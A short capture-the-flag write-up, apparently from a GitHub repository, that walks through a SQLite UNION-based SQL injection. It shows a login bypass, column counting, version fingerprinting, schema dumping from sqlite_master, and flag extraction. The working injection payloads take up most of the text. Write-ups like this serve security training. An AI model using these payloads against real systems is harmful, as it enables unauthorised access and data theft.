## More SQLi

A simple: ' or 1=1-- gets us past the login screen

![image](https://github.com/user-attachments/assets/71a46034-7e9a-42a7-81c6-2df9a1263778)

First we want to make see how many columns there are in the query:

' union select 1,2--

![image](https://github.com/user-attachments/assets/cdae028a-6898-4ef5-a367-ac858ec5758b)

' union select 1,2,3--

![image](https://github.com/user-attachments/assets/d77ed558-5faa-45fa-8700-48bc2a07cbea)

This shows that we need to have 3 columns in our query.

' union select 1,2,sqlite_version()--

![image](https://github.com/user-attachments/assets/5f6f4846-8a8d-41bb-9ef1-562b357b0e13)

This tells us that we are running sqlite, so we know what syntax to use to get the tables/column information.

' union select 1,2,sql from sqlite_master--

![image](https://github.com/user-attachments/assets/326b8114-cf92-48b3-9b0d-b410e72ec41b)

This shows the tables/columns that we are working with, looks like flag is in more_table.

' union select 1,2,flag from more_table--

![image](https://github.com/user-attachments/assets/5e490054-1abc-4327-bfab-8ee94543025b)

Overall a pretty standard UNION SELECT SQLi!

Sources: 

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
